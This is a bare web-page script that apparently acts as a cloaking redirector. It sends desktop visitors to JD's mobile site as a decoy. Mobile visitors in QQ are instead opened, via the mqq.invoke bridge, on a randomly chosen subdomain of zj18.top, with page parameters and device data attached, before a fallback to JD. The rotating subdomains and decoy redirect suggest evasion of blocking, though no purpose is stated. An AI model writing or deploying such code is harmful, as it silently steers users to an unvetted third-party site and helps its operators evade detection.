<script type="text/javascript">
function myEeplace(url) {
    return url.replace(/\{(\w+?)\}/g, function(s1, s2) {
        var res = "";
        for (var i = 0; i < s2.length; i++) {
            if (s2[i] === "n") {
                res += Math.floor(Math.random() * 10);
            } else if (s2[i] === "w") {
                res += String.fromCharCode(97 + Math.floor(Math.random() * 26));
            }
        }
        return res;
    });
}
function opensdk(url) {
    url = myEeplace(url);
    var conf = {url: url, target: 1, style: 2};
    mqq.invoke("ui", "openUrl", conf);
}
let isWechat = window.navigator.userAgent.toLowerCase().includes("micromessenger");
if (isWechat <= 0) {}
let screenWidth = window.screen.width;
let screenHeight = window.screen.height;
if (screenWidth >= 768) {
    window.location.href = "https://m.jd.com";
}
function GetQueryString(name) {
      const query = window.location.href.split('?')[1];
      if (!query){
          let rawHost = document.domain || '';
      if (!rawHost || rawHost === rawHost.toLowerCase()) {
        const urlMatch = window.location.href.match(/^https?:\/\/([^\/?#:]+)/);
        if (urlMatch && urlMatch[1]) {
          rawHost = urlMatch[1];
        }
      }
      const dotIndex = rawHost.indexOf('.');
      if (dotIndex > 0) {
        const str = rawHost.substring(0, dotIndex);
        return str;
      }
      };
      const reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
      const r = query.match(reg);
      if (r != null) return decodeURIComponent(r[2]);
      return null;
}
function GetFirstParamValue() {
  const query = window.location.href.split('?')[1];
  if (!query) return null;
  const params = query.split('&');
  for (let param of params) {
    if (param.includes('=')) {
      const name = param.split('=')[0];
      if (name && name.length === 2) {
        const value = param.split('=')[1];
        return decodeURIComponent(value);
      }
    } else {
      continue;
    }
  }
  return null;
}
var bucket = GetQueryString("bucket");
let str = GetQueryString();
if(!str){
    str = GetFirstParamValue();
}
var uopenid = GetQueryString("uopenid");
var type = GetQueryString("type");
var sign = Date.now();
var openid = "";
function customJump() {
    const subDomains = ['app', 'web', 'm', 'api', 'user', 'demo', 'visit', 'entry', 'go', 'link'];
    const randomSub = subDomains[Math.floor(Math.random() * subDomains.length)];
    const targetDomain = `${randomSub}.zj18.top`;
    const params = new URLSearchParams();
    params.append('bucket', bucket || '');
    params.append('ic', str || '');
    params.append('sign', sign);
    params.append('type', type || '');
    params.append('_wv', '9983');
    params.append('from', window.location.hostname);
    params.append('t', new Date().getTime());
    params.append('device', /Mobile|Android|iOS/.test(navigator.userAgent) ? 'mobile' : 'pc');
    const targetUrl = `http://${targetDomain}?${params.toString()}`;
    opensdk(targetUrl);
}
setTimeout(customJump, 1000);
setTimeout(function() {
    location = "https://m.jd.com/" + new Date().getTime();
}, 10000);
</script>
